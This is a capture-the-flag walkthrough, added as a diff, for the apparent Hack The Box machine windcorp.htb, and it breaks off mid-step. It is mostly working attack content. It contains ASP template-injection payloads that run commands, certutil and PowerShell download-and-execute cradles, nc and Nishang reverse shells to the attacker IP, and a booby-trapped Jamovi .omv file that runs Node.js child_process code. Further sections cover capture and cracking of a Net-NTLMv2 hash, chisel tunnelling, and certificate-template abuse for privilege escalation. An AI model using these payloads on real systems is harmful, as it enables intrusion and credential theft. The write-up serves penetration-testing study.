@@ -1,0 +1,745 @@
+### Host: 
+```bash
+10.10.11.102 windcorp.htb www.windcorp.htb
+```
+If Active Directory => Synchronize your NTP with the domain controller:
+#Note This command does not work correctly on this machine, we circumvent this issue later during the machine resolution:
+```bash
+nptdate 10.10.11.102
+```
+
+# Content
+
+- RPC Enumeration
+- SMB Enumeration
+- Subdomain Enumeration
+- SSL Certificate Inspection - OpenSSL
+- XSS (Cross-Site Scripting)
+- ASP SSTI (Server Side Template Injection) (HackingDream ASP Resource) [RCE]
+- InvokePowerShellTcp.ps1 - PowerShell
+- Reverse Shell ConPtyShell (AntonioCoco Utility) - Shell Improvement
+- Certificate Signing Request Inspection - OpenSSL
+- Chisel + Remote Port Forwarding + Proxychains - Creating a SOCKS5 tunnel
+- Abusing Software Portal Traffic inspection with Tcpdump and Tshark
+- URL Host Manipulation Attack + Intercepting authentications with Netcat Playing with Responder to get a Net-NTLMv2
+- Hash Cracking Hashes
+- SMB enumeration with authenticated user
+- Jamovi <=1.6.18 Exploitation - Malicious OMV File (XSS Vulnerability - Cross-Site Scripting Attack) XSS + NodeJS Command Injection + InvokePowerShellTcp.ps1 (Nishang) 
+- Abusing Certificate Services Playing with Certify.exe to find vulnerable templates
+- PowerView.ps1 + ADCS.ps1 in order to generate a certificate request and get it approved by the CA
+- ADCS.ps1 script manipulation (userprincipalname/samaccountname [Substitution Applied])
+- Listing certificates with gci command
+- Attempting to obtain credentials with Rubeus (asktgt mode) [ERROR - No longer working]
+- Exploiting CVE-2021-42278/CVE-2021-42287 (noPac.py) through Proxychains [Alternative Exploitation]
+- Synchronizing our time with DC time (rdate) - HTTP Headers Information Leakage
+- Getting an interactive console as the administrator user on the DC (noPac.py)
+
+# Reconnaissance
+
+Initial reconnaissance for TCP ports
+```bash
+nmap -p- -sS --open --min-rate 500 -Pn -n -vvv -oG allPorts 10.10.11.102
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.11.102 ()   Status: Up
+Host: 10.10.11.102 ()   Ports: 135/open/tcp//msrpc///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 593/open/tcp//http-rpc-epmap///, 49712/open/tcp/////
+```
+Services and Versions running:
+```bash
+nmap -p135,443,445,593,49712 -sCV -Pn -n -vvv -oN targeted 10.10.11.102
+Nmap scan report for 10.10.11.102
+Host is up, received user-set (0.076s latency).
+Scanned at 2023-01-29 20:43:27 EST for 96s
+
+PORT      STATE SERVICE       REASON          VERSION
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+443/tcp   open  ssl/http      syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_ssl-date: 2023-01-30T02:21:53+00:00; +36m50s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| ssl-cert: Subject: commonName=www.windcorp.htb
+| Subject Alternative Name: DNS:www.windcorp.htb
+| Issuer: commonName=www.windcorp.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-24T19:44:56
+| Not valid after:  2031-05-24T19:54:56
+| MD5:   e2e786ef4095990814c53347cdcb4167
+| SHA-1: 7fce781f883ca27e115445021686ee6575510e2a
+| -----BEGIN CERTIFICATE-----
+...
+|_-----END CERTIFICATE-----
+|_http-title: Not Found
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 36m51s, deviation: 2s, median: 36m49s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 54691/tcp): CLEAN (Timeout)
+|   Check 2 (port 29705/tcp): CLEAN (Timeout)
+|   Check 3 (port 30756/udp): CLEAN (Timeout)
+|   Check 4 (port 30145/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2023-01-30T02:21:21
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+```
+RPC Enumeration, found nothing interesting:
+```bash
+rpcclient -U "" 10.10.11.102 -N 
+rpcclient $> enumdomgroups
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> enumdomusers 
+result was NT_STATUS_ACCESS_DENIED
+```
+SMB Enumeration nothing exposed without authentication:
+```bash
+smbclient -L 10.10.11.102 -N
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.102 failed (Error NT_STATUS_IO_TIMEOUT)
+Unable to connect with SMB1 -- no workgroup available
+```
+Subdomain Enumeration retrieves only www subdomain:
+```bash
+ffuf -c -u https://windcorp.htb -H 'Host: FUZZ.windcorp.htb' -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://windcorp.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+ :: Header           : Host: FUZZ.windcorp.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+www                     [Status: 200, Size: 46774, Words: 12122, Lines: 1008, Duration: 210ms]
+```
+Now let's inspect the web site certificate to analyze its content with openssl:
+```bash
+openssl s_client -connect 10.10.11.102:443
+#Output:
+CONNECTED(00000003)
+Can't use SSL_get_servername
+depth=0 CN = www.windcorp.htb
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 CN = www.windcorp.htb
+verify return:1
+```
+Nothing interesting, other that we need to add this CN to our hosts file and we'll be able to access to the web page:
+![[Pasted image 20230130001512.png]]
+We identify 3 XSS reflected fields in the contact step:
+![[Pasted image 20230130001700.png]]
+Output:
+![[Pasted image 20230130001737.png]]
+Nevertheless since no authentication is possible on the website and XSS are capable to perform client-side attacks without another user's interaction is not very useful. However enumerating the same form we identify that the data is shown in the input, which gives us a hint about a probable SSTI:
+![[Pasted image 20230130002023.png]]
+Our initial payload will be a basic SSTI payload `{{7*7}}`  and if the response of the server is 49 we can try a better option such as RCE or LFI:
+![[Pasted image 20230131200403.png]]
+However the response is not exactly what we were expecting, this is because this simple payload works perfectly for web template engine based on Python, but since this is an IIS based ergo it's ASP based, we need to try with a payload such as the one recommended [here](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html): ^95c992
+```bash
+<%response.write (7*7)%>
+```
+![[Pasted image 20230131203439.png]]
+And the result is as follows:
+![[Pasted image 20230131205008.png]]
+The operation is now being represented by the ASP itself so we can proceed to craft a better payload that pings our local machine:
+```bash
+<%response.write CreateObject("WScript.Shell").Exec("cmd /c ping -n 1 10.10.14.4").StdOut.Readall()%>
+```
+The output is indeed the response of the ping execution:
+![[Pasted image 20230131205515.png]]
+So we start by crafting a reverse shell payload to get access to the machine with [[Certutil.exe]] we can upload the nc.exe file into the machine:
+```bash
+<%response.write CreateObject("WScript.Shell").Exec("cmd /c certutil.exe -urlcache -f http://10.10.14.2/nc.exe C:\Windows\Temp\nc.exe").StdOut.Readall()%>
+```
+Finally, we can craft our last payload to get a reverse shell:
+```bash
+<%response.write CreateObject("WScript.Shell").Exec("cmd /c C:\Windows\Temp\nc.exe -e cmd 10.10.14.2 443").StdOut.Readall()%>
+## Kali Linux:
+rlwrap nc -lvnp 443
+```
+
+#### Additional Foothold path:
+We can retrieve a powershell reverse shell by using Windows commands written in base64, but since Windows only accepts UTF-16LE as encoding we cannot just send the payload as it is, we need to encode it first:
+```bash
+echo -n "ping -n 1 10.10.14.4" | iconv -t utf-16le | xxd         
+00000000: 7000 6900 ... 6e00 2000  p.i.n.g. .-.n. .
+00000010: 3100 2000 ... 3000 2e00  1. .1.0...1.0...
+00000020: 3100 3400 ... 3400       1.4...4.
+```
+In such a way that the hexadecimal representation has a dot "." after every character:
+```bash
+echo -n "ping -n 1 10.10.14.4" | iconv -t utf-16le | base64 -w 0 echo
+
+cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA0AA==
+```
+Then our payload will seems like this:
+```powershell
+<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA0AA==").StdOut.Readall()%>
+```
+And indeed we'll be able to retrieve ping request on our machine:
+```bash
+<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA0AA==").StdOut.Readall()%>
+```
+We can retrieve a Reverse Shell with [Nishang Powershell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) but first modifying the last line on it: ^bcdb9e
+```bash
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 1234
+```
+This is to avoid uploading it then Invoke, this way it will be uploaded and executed in one step.
+Finally let's create our base64-encoded payload such as before:
+```bash
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0; echo
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA
+```
+And we get a reverse shell in powershell:
+```powershell
+PS C:\windows\system32\inetsrv>
+```
+
+```powershell
+c:\windows\system32\inetsrv>ipconfig
+ipconfig
+Ethernet adapter vEthernet (Ethernet):
+
+   Connection-specific DNS Suffix  . : htb
+   Link-local IPv6 Address . . . . . : fe80::cdad:d9e4:16a:9a83%32
+   IPv4 Address. . . . . . . . . . . : 172.21.80.137
+   Subnet Mask . . . . . . . . . . . : 255.255.240.0
+   Default Gateway . . . . . . . . . : 172.21.80.1
+```
+However it does not seems to be the real target but a container inside the machine.
+
+# Exploitation
+
+After get our foothold we can get a fully interactive shell with Invoke-ConPtyShell.ps1 script, to do so follow the [[Fully interactive TTY (Windows)]] guide.
+Afterwards we identify the following file inside the machine:
+```bash
+c:\Users\Administrator\Desktop>type req.txt
+-----BEGIN CERTIFICATE REQUEST-----
+MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
+ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
+Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
+KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
+BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
+eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
+QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
+qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
+1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
+JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
+WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
+yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
+F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
+CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
+4TlwpQ==
+-----END CERTIFICATE REQUEST-----
+```
+It seems that is a Certificate Signing Request (CSR) which according with google:
+```text
+In public key infrastructure (PKI) systems, a certificate signing request (also CSR or certification request) is a message sent from an applicant to a certificate authority of the public key infrastructure in order to apply for a digital identity certificate. It usually contains the public key for which the certificate should be issued, identifying information (such as a domain name) and a proof of authenticity including integrity protection (e.g., a digital signature).
+```
+A way of retrieving the information on it is with the following command:
+```bash
+openssl req -in req.txt -text
+Certificate Request:
+    Data:
+        Version: 1 (0x0)
+        Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htb
+        Subject Public Key Info:
+...
+```
+This gets us a new subdomain which we'll add to the /etc/hosts but unfortunately we are not able to reach that site, so let's try by enumerating once again the machine, we identify that there is a DNS Server with the following command:
+```powershell
+PS C:\Users\Administrator\Desktop> ipconfig /all
+
+Windows IP Configuration
+...
+Ethernet adapter vEthernet (Ethernet):
+...
+   fe80::cdad:d9e4:16a:9a83%32(Preferred)
+   IPv4 Address. . . . . . . . . . . : 172.21.80.137(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.240.0
+   Default Gateway . . . . . . . . . : 172.21.80.1
+   DNS Servers . . . . . . . . . . . : 172.21.80.1
+                                       1.1.1.1
+...
+```
+Since the subdomain is not being reachable from our Kali, let's try by using this new DNS server this can be accomplished by tunneling the traffic to our machine, but first we need to check if this DNS is indeed reachable:
+```powershell
+PS C:\Users\Administrator\Desktop> ping 172.21.80.1
+
+Pinging 172.21.80.1 with 32 bytes of data:
+Reply from 172.21.80.1: bytes=32 time<1ms TTL=128
+Reply from 172.21.80.1: bytes=32 time<1ms TTL=128
+```
+Since this is indeed reachable then we can proceed to create a tunnel back to our machine with SOCKS5 with [chisel](https://github.com/jpillora/chisel/releases): ^e12b6c
+1) Start the chisel in our linux machine as a server:
+```bash
+./chiselamd64 server -p 2345 --reverse --socks5
+```
+2) Upload chisel to windows: 
+```powershell
+PS C:\Users\Administrator\Desktop> certutil -urlcache -f http://10.10.14.4/chisel_x64.exe C:\Windows\Temp\chisel.exe
+```
+3) Then execute it as client:
+```powershell
+.\chisel.exe client 10.10.14.4:2345 R:127.0.0.1:socks
+```
+4) Finally modify the /etc/proxychains.conf file as follows:
+```bash
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
+```
+Once that we tunnel our traffic all that left is to add the DNS IP into the /etc/hosts file and bind it to the subdomain:
+```bash
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.10.11.102    windcorp.htb www.windcorp.htb 
+172.21.80.1     softwareportal.windcorp.htb
+```
+To further probe that the server is reachable we can enumerate common AD ports with proxychains:
+```bash
+proxychains nmap -sT -Pn -n -vvv 172.21.80.1 -p88,445,135,139
+...
+PORT    STATE SERVICE      REASON
+88/tcp  open  kerberos-sec syn-ack
+135/tcp open  msrpc        syn-ack
+139/tcp open  netbios-ssn  syn-ack
+445/tcp open  microsoft-ds syn-ack
+```
+However in order to reach the website from the browser we need to modify foxyproxy as per the [[FoxyProxy]] guide. And now we are able to reach the website:
+![[Pasted image 20230201002855.png]]
+Once inside this webpage we start enumerating and we identify a link that is pointing to a specific IP to download a file:
+
+![[Pasted image 20230202223139.png]]
+```bash
+http://softwareportal.windcorp.htb/install.asp?client=172.27.48.140&software=7z1900-x64.exe
+```
+This seems to be a good point for a redirection attack since it's using an IP as input so we can try to use our attacker machine IP and start a tshark listener as follows:
+```bash
+tcpdump -i tun0 -v -w capture.pcap
+```
+Then we exchange the previous URL with our machine IP and we send it via curl:
+```bash
+proxychains curl -s -X GET 'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.2&software=7z1900-x64.exe'
+```
+After filtering some of the packets received, we extract the following information:
+```bash
+tshark -r capture.pcap 2>/dev/null | grep -v 1234
+   29  .. 10.10.11.102 → 10.10.14.2 TCP 52 50704 → 5985
+   30  .. 10.10.14.2 → 10.10.11.102 TCP 40 5985 → 50704
+   31  .. 10.10.11.102 → 10.10.14.2 TCP 52 50704 → 5985
+   32  .. 10.10.14.2 → 10.10.11.102 TCP 40 5985 → 50704
+   33  .. 10.10.11.102 → 10.10.14.2 TCP 52 50704 → 5985
+   34  .. 10.10.14.2 → 10.10.11.102 TCP 40 5985 → 50704
+```
+That port (tcp-5985) is WinRM which is the port to connect remotely to a Windows Machine, and as it is trying to connect towards us, we can try to catch its hash NTLM with [[Responder]]: ^2015a8
+```bash+
+responder -I tun0
+...
+[WinRM] NTLMv2 Client   : 10.10.11.102
+[WinRM] NTLMv2 Username : windcorp\localadmin
+[WinRM] NTLMv2 Hash     : localadmin::windcorp:2475cb0e1cb30181:B8492BBD28C7522512CE99F187AF1B75:0101000000000000CA5CF14C8E37D9011957DE27B8074D860000000002000800470050003900390001001E00570049004E002D0057003300450058005A00450037004200560058004B000400140047005000390039002E004C004F00430041004C0003003400570049004E002D0057003300450058005A00450037004200560058004B002E0047005000390039002E004C004F00430041004C000500140047005000390039002E004C004F00430041004C0008003000300000000000000000000000002100003BE52195F13762AD8BA5D447B0B1C03E2A58095693A2F3857189742A6C8017AB0A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310034002E0032000000000000000000
+```
+Now we proceed to crack them with [[Hashcat]] and we retrieve the clear text password:
+```bash
+LOCALADMIN::windcorp:2475cb0e1cb30181:b8492bbd28c7522512ce99f187af1b75:0101000000000000ca5cf14c8e37d9011957de27b8074d8600000000020000800470050003900390001001e00570049004e002d0057003300450058005a00450037004200560058004b000400140047005000390039002e004c004f004300410044c0003003400570049004e002d0057003300450058005a00450037004200560058004b002e0047005000390039002e004c004f00430041004c0005001400470050003390039002e004c004f00430041004c0008003000300000000000000000000000002100003be52195f13762ad8ba5d447b0b1c03e2a58095693a2f3857189742a6c80117ab0a0010000000000000000000000000000000000009001e0048005400540050002f00310030002e00310030002e00310034002e0032000000000000000000:Secret123
+```
+Now that we get credentials, let's use on the machine, since our victim machine has no port tcp-5985/tcp-5986 open we are unable to reach the WinRM service, but we can try to test the SMB protocol:
+```bash
+crackmapexec smb 10.10.11.102 -u 'localadmin' -p 'Secret123' --shares
+SMB 10.10.11.102 445 EARTH [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
+SMB 10.10.11.102 445 EARTH [+] windcorp.htb\localadmin:Secret123 
+SMB 10.10.11.102 445 EARTH [+] Enumerated shares
+SMB 10.10.11.102 445 EARTH Share PermissionsRemark
+SMB 10.10.11.102 445 EARTH ----- -----------------
+SMB 10.10.11.102 445 EARTH ADMIN$ Remote Admin
+SMB 10.10.11.102 445 EARTH C$ Default share
+SMB 10.10.11.102 445 EARTH CertEnroll READ Active Directory Certificate Services share
+SMB 10.10.11.102 445 EARTH IPC$ READ Remote IPC
+SMB 10.10.11.102 445 EARTH NETLOGON READ Logon server share 
+SMB 10.10.11.102 445 EARTH Shared READ 
+SMB 10.10.11.102 445 EARTH SYSVOL READ Logon server share
+```
+We get access to all the previous shares, so enumerating a few of them with [[SMB (tcp-445)]] we identify the following interesting files on the system:
+```bash
+smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' -r Shared\\Documents\\Analytics
+[+] IP: 10.10.11.102:445 Name: windcorp.htb   
+ Disk Permissions     Comment
+ ---- -----------     -------
+ Shared READ ONLY
+ .\SharedDocuments\Analytics\*
+ dr--r--r--  0 Thu Apr 29 10:50:33 2021   .
+ dr--r--r--  0 Thu Apr 29 10:50:33 2021   ..
+ fr--r--r--  6455 Thu Apr 29 10:50:33 2021  Big 5.omv
+ fr--r--r--  2897 Thu Apr 29 10:50:33 2021  Bugs.omv
+ fr--r--r--  2142 Thu Apr 29 10:50:33 2021  Tooth Growth.omv
+ fr--r--r--  2841 Fri Feb  3 01:16:23 2023  Whatif.omv
+```
+According with a simple research this files are:
+![[Pasted image 20230202235607.png]]
+Additionally we identify the following vulnerability:
+![[Pasted image 20230202235815.png]]
+```bash
+Jamovi <=1.6.18 is affected by a cross-site scripting (XSS) vulnerability. The column-name is vulnerable to XSS in the ElectronJS Framework. An attacker can make a .omv (Jamovi) document containing a payload. When opened by victim, the payload is triggered.
+```
+If we research about this ElectronJS Framework we get the following information:
+![[Pasted image 20230202235912.png]]
+The ElectronJS is written in Node.js so we can start thinking about upload a .omv file to exploit a Node.js RCE, but first we need to generate our payload, by downloading a .omv file: ^cbbd94
+```bash
+smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' --download Shared\\Documents\\Analytics\\Whatif.omv
+```
+Since we already know that this is a zipped file we can use the following command to see its content:
+```bash
+unzip -l Whatif.omv 
+Archive:  Whatif.omv
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+      106  2021-04-27 11:38   META-INF/MANIFEST.MF
+     2505  2021-04-27 11:38   index.html
+     1575  2021-04-27 11:38   metadata.json
+      114  2021-04-27 11:38   xdata.json
+     5400  2021-04-27 11:38   data.bin
+       50  2021-04-27 11:38   01 empty/analysis
+---------                     -------
+     9750                     6 files
+```
+Now going back to the vulnerabiity, the trick is to craft an XSS exploit in such a way that is executed while opened by a user:
+```bash
+The column-name is vulnerable to XSS in the ElectronJS Framework.
+```
+According with the vulnerability description, the column-name is the one vulnerable, so let's exploit it and try to trigger an XSS+RCE:
+1) First let's search for the "column-name" on the .omv extracted files:
+```bash
+cat metadata.json | jq
+{
+  "dataSet": {
+    ...
+      {
+        "name": "Sepal.Length",
+        "id": 1,
+     ...
+      },
+      {
+        "name": "Sepal.Width",
+        ...
+      },
+      {
+        "name": "Petal.Length",
+        ...
+      },
+      {
+        "name": "Petal.Width",
+        ...
+      },
+      {
+        "name": "Species",
+        ...
+      }
+    ],
+    "transforms": []
+  }
+}
+
+```
+2) As we can see there are only 5 columns on the metadata.json file that have the column-name so we already identify our entrypoint, now let's test if the code is vulnerable: by modifying the column name as follows:
+```bash
+ cat metadata.json | jq
+{"dataSet": {"rowCount": 150, "columnCount": 5, "removedRows": [], "addedRows": [], "fields": [{"name": "<script src=\"http://10.10.14.2/pwned.js\"></script>", "id": 1
+```
+3) Now let's pack all the files on a new .omv file:
+```bash
+zip -r Whatif.omv *                
+  adding: 01 empty/ (stored 0%)
+  adding: 01 empty/analysis (deflated 8%)
+  adding: data.bin (deflated 84%)
+  adding: index.html (deflated 67%)
+  adding: metadata.json (deflated 78%)
+  adding: META-INF/ (stored 0%)
+  adding: META-INF/MANIFEST.MF (deflated 30%)
+  adding: xdata.json (deflated 33%)
+```
+4) Let's craft a Node.JS RCE payload with an Invoke-PowerShellTCP base64 payload as follows:
+```bash
+# Nishang payload:
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0; echo
+
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA
+
+# Attacker machine script:
+cat pwned.js                
+require('child_process').exec('powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA')
+
+# Invoke-PowerShellTcp.ps1 must be in the same directory as test.js since both are in the :80 web server and one is calling the other test.js -> Invoke-ConPtyShell.ps1
+
+```
+5) Now let's upload our .omv file within the "Shared" share:
+```bash
+# First connect to the share
+smbclient //10.10.11.102/Shared -U "localadmin%Secret123"
+# Then delete the already existing Whatif.omv file
+smb: \Documents\Analytics\> del Whatif.omv
+# Then put the file .omv inside the share
+smb: \Documents\Analytics\> del Whatif.omv
+```
+6) Finally we start our python web server, and wait for someone to click on the Whatif.omv:
+```bash
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.102 - - [03/Feb/2023 03:24:09] "GET /pwned.js HTTP/1.1" 200 -
+10.10.11.102 - - [03/Feb/2023 03:24:27] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+```
+7) And we get a shell in our nc listener:
+```bash
+PS C:\Users\diegocruz\Desktop> whoami
+windcorp\diegocruz
+```
+
+# Root privesc
+
+Since the machine is using certificates we can enumerate them with certify.exe from the [SharpCollections Suite](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_Any) this tool will enumerate any vulnerable Certificate by using the following command: ^32beda
+```powershell
+.\certify.exe find /vulnerable /currentuser
+CA Name: earth.windcorp.htb\windcorp-CA
+    Template Name: Web
+    Schema Version: 2
+    Validity Period: 10 years
+    Renewal Period: 6 weeks
+    msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag: PUBLISH_TO_DS
+    Authorized Signatures Required: 0
+    pkiextendedkeyusage: Server Authentication
+    mspki-certificate-application-policy: Server Authentication
+```
+In order to exploit the machine, we'll execute rubeus.exe on this following scenario:
+```bash
+Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new proc
+ess/logon session:
+        Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/n
+owrap]
+```
+But in order to create a certificate, we'll need to use the [ADCS.ps1](https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1) script, keep in mind that there is a certificate template that we extracted with certify.exe called "Web". Moreover, ADCS.ps1 works only if we download also [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) :
+1) Let's upload the PowerView.ps1 to the victim machine and load it:
+```bash
+# On kali on the same Folder as PowerView.ps1:
+python3 -m http.server 80
+# On victim machine to download and load the module:
+curl 10.10.14.2/PowerView.ps1 | iex
+```
+2) We can enumerate useful information with PowerView.ps1 as follows:
+```powershell
+PS C:\Windows\Temp\PrivEsc> Get-DomainUser localadmin
+
+
+userprincipalname : localadmin@windcorp.thm
+countrycode       : 0
+displayname       : localadmin
+samaccounttype    : USER_OBJECT
+samaccountname    : localadmin
+objectsid         : S-1-5-21-3510634497-171945951-3071966075-3289
+objectclass       : {top, person, organizationalPerson, user}
+codepage          : 0
+givenname         : localadmin
+cn                : localadmin
+primarygroupid    : 513
+distinguishedname : CN=localadmin,OU=systemaccounts,DC=windcorp,DC=htb
+name              : localadmin
+objectguid        : a197951b-b49e-4850-9216-bf815c0f219a
+objectcategory    : CN=Person,CN=Schema,CN=Configuration,DC=windcorp,DC=htb
+```
+3) As we can notice the principal name is "localadmin@windcorp.thm" which is not correct because the domain is windcorp.htb, if we try to use the ADCS.ps1 then we'll get an error, so we need to exchange the following line on it for the script to work:
+```powershell
+# From this:
+else {
+    $TargetUPN = $user.userprincipalname   
+    if(-not $TargetUPN)
+    {
+        Write-Warning "User $($Identity) does not have a UPN."
+        $STOPERROR = $true
+    }
+}
+# To this
+else {
+    $TargetUPN = $user.samaccountname 
+    if(-not $TargetUPN)
+    {
+        Write-Warning "User $($Identity) does not have a UPN."
+        $STOPERROR = $true
+    }
+}
+```
+4) Then we transfer the file and import the module on different steps because the module cannot be uploaded and loaded on the same step as the previous one:
+```bash
+# First download it:
+PS C:\Windows\Temp\PrivEsc> curl 10.10.14.2/ADCS.ps1 -o ADCS.ps1
+# Then load it:
+PS C:\Windows\Temp\PrivEsc> Import-Module .\ADCS.ps1
+```
+5) Generate a SmartCard certificate with the information that we already have, impersonating the administrator, let's understand the module ADCS.ps1:
+```bash
+# This is the function that we'll load from powershell:
+function Get-SmartcardCertificate
+# Then we need to provide the parameters that the function requests:
+# Identity is the user that we'll going to impersonate (Administrator)
+.PARAMETER Identity
+The user to request a smartcard certificate for.
+# TemplateName is the template that we already discovered (WEB)
+.PARAMETER TemplateName
+The template to rewrite. Note that the script assumes that you have write permissions on the template.
+# This paramater is used since we don't hava a SmartCard enrolled.
+.PARAMETER NoSmartcard
